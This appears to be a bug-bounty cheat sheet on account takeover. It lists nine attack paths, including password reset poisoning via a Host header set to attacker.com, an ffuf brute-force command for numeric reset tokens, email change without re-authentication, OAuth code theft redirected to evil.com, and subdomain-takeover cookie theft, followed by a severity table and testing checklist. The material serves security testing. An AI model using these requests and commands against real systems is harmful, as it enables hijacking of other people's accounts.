# ATO — Account Takeover Taxonomy

## Path 1: Password Reset Poisoning
```bash
POST /forgot-password
Host: attacker.com          # or X-Forwarded-Host: attacker.com
email=victim@company.com
# Reset link sent to attacker.com/reset?token=XXXX
```

## Path 2: Reset Token in Referrer Leak
```
GET /reset-password?token=ABC123
→ page loads: <script src="https://analytics.com/track.js">
→ Referer: https://target.com/reset-password?token=ABC123 sent to analytics
```

## Path 3: Predictable / Weak Reset Tokens
```bash
# Brute force 6-digit numeric token
ffuf -u "https://target.com/reset?token=FUZZ" \
     -w <(seq -w 000000 999999) -fc 404 -t 50
```

## Path 4: Token Not Expiring
```
Request token → wait 2 hours → still works? = bug
Request token #1 → request token #2 → use token #1 → still works? = bug
```

## Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email
{"new_email": "attacker@evil.com"}   # no current_password required
```

## Path 6: OAuth Code Theft (via Open Redirect)
```
1. Find open redirect on target.com
2. Check if target.com is OAuth redirect_uri allowlisted
3. Craft: /oauth/authorize?redirect_uri=https://target.com/redirect?to=https://evil.com
4. Victim clicks → auth code arrives at evil.com via Referer or fragment
```

## Path 7: Session Fixation
```
1. Attacker gets valid session ID
2. Forces victim to use it (via link/cookie)
3. Victim logs in → session now authenticated as victim
4. Attacker uses same session ID → ATO
```

## Path 8: JWT alg=none / RS256→HS256 Confusion
See api-misconfig.md

## Path 9: Subdomain Takeover → Cookie Scope → ATO
```
1. Takeover sub.target.com
2. Check if target sets cookies with domain=.target.com
3. If yes: takeover page receives those cookies → ATO
```

## ATO Priority Chain
| Priority | Condition | Severity |
|----------|-----------|----------|
| Critical | No-user-interaction ATO | Critical |
| High | Requires one email click OR existing session | High |
| Medium | Requires phishing + user interaction | Medium |
| Low | Requires attacker to be MitM | Low |

## Testing Checklist
```
[ ] Test password reset host header injection
[ ] Check reset token in Referer headers
[ ] Brute force reset tokens (if numeric/short)
[ ] Test token expiration / reuse
[ ] Test email change without re-auth
[ ] Test OAuth code theft via open redirect
[ ] Test session fixation
[ ] Test JWT algorithm confusion
[ ] Check subdomain takeover → cookie scope
```